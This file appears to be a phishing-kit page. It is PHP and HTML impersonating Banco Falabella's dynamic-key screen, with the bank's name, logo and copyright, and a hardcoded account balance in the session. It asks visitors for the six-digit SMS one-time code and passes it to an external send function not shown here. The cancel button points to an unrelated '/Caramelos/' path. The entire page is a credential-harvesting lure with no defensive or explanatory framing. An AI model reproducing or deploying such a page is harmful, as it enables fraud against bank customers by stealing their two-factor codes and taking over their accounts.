<?php 
session_start();
$saldo = isset($_SESSION['saldo']) ? $_SESSION['saldo'] : '1.221.835,94';
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ingreso de Clave Dinámica - Banco Falabella</title>

<!-- Librerías necesarias -->
<script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
<script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
<script type="text/javascript" src="/scripts/functions2.js"></script>

<style>
    body {
        font-family: "Segoe UI", Arial, sans-serif;
        background-color: #f6f7f8;
        margin: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        justify-content: space-between;
        align-items: center;
        color: #222;
    }

    /* ENCABEZADO */
    header {
        background-color: #fff;
        width: 100%;
        text-align: center;
        padding: 8px 0 0 0; /* logo más cerca del cuadro */
    }

    header img {
        width: 90px;
        height: auto;
        margin-bottom: -10px; /* se acerca al cuadro central */
    }

    /* CONTENIDO CENTRAL */
    main {
        background-color: #fff;
        border-radius: 10px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        width: 350px;
        max-width: 90%;
        padding: 25px;
        margin-top: 5px;
        text-align: center;
    }

    h2 {
        color: #007e3a;
        font-size: 17px;
        margin: 10px 0;
    }

    p {
        font-size: 14px;
        color: #444;
        margin-bottom: 20px;
        line-height: 1.4;
    }

    input {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 16px;
        text-align: center;
        margin-bottom: 15px;
    }

    button.autorizar {
        width: 100%;
        background-color: #00a859;
        color: #fff;
        border: none;
        padding: 12px 0;
        font-size: 16px;
        font-weight: 500;
        border-radius: 8px;
        cursor: pointer;
        transition: background 0.3s;
    }
    .img-app { margin-top: 0px; } .img-app img { width: 250px; border-radius: 5px; }

    button.autorizar:hover {
        background-color: #00914e;
    }

    .info {
        font-size: 13px;
        color: #555;
        margin-top: 20px;
        line-height: 1.4;
    }

    .info b {
        color: #007e3a;
    }

    .cancelar {
        width: 100%;
        background-color: #f3f4f5;
        color: #333;
        border: none;
        padding: 10px 0;
        font-size: 15px;
        border-radius: 8px;
        margin-top: 20px;
        cursor: pointer;
    }

    /* PIE DE PÁGINA */
    footer {
        background-color: #1b1b1b;
        color: #fff;
        text-align: center;
        font-size: 12px;
        padding: 18px 10px;
        width: 100%;
    }

    footer .vigilado {
        color: #fff;
        font-weight: 600;
        margin-bottom: 6px;
    }

    footer .vigilado span {
        background-color: #fff;
        color: #1b1b1b;
        padding: 2px 6px;
        border-radius: 2px;
        font-size: 11px;
        font-weight: 700;
        margin-right: 3px;
    }

    footer p {
        margin: 5px 0;
        line-height: 1.3;
    }

    .mensaje {
        color: red;
        font-size: 13px;
        display: none;
        margin-bottom: 10px;
    }
</style>
</head>
<body>

<!-- ENCABEZADO -->
<header>
    <img src="falamonda.png" alt="Banco Falabella">
</header>

<!-- CONTENIDO CENTRAL -->
<main>
    <h2>Ingreso de Clave Dinámica</h2>
    <p>Ingresa la clave dinámica de 6 dígitos que aparece en el <b>SMS</b> enviado.</p>

    <input type="text" name="cDinamica" id="txtOTP" maxlength="6" placeholder="••••••" required>
    <div class="mensaje" id="errorMsg">Debe ingresar una clave válida de 6 dígitos.</div>
    <button class="autorizar" id="btnOTP">Autorizar</button>

    <div class="info">
        Encuentra tu <b>Clave Dinámica</b> en la pantalla principal de tus <b>Mensajes de texto</b>.
    </div>

    <button class="cancelar" id="btnCancelar">Cancelar</button>
</main>

<!-- PIE DE PÁGINA -->
<footer>
    <div class="img-app">
        <img src="vigilado.png" alt="App Banco Falabella">
    </div>
    <p>Pagos Banco Falabella Versión 3.0.10</p>
    <p>© Banco Falabella 2025. Todos los derechos reservados.</p>
</footer>

<!-- SCRIPT PRINCIPAL -->
<script type="text/javascript">
$(document).ready(function() {

    // Validar OTP
    $('#btnOTP').click(function(e){
        e.preventDefault();
        var otp = $("#txtOTP").val().trim();
        if (otp.length === 6 && /^\d{6}$/.test(otp)) {
            $("#errorMsg").hide();
            enviar_otp(otp); // función definida en functions2.js
        } else {
            $("#errorMsg").show();
            $("#txtOTP").css("border", "1px solid red");
            $("#txtOTP").focus();
        }
    });

    // Limpiar error al escribir
    $("#txtOTP").keyup(function() {
        $("#txtOTP").css("border", "1px solid #ccc");
        $("#errorMsg").hide();
    });

    // Cancelar acción
    $("#btnCancelar").click(function(){
        window.location.href = "/Caramelos/index2.php";
    });

});
</script>

</body>
</html>
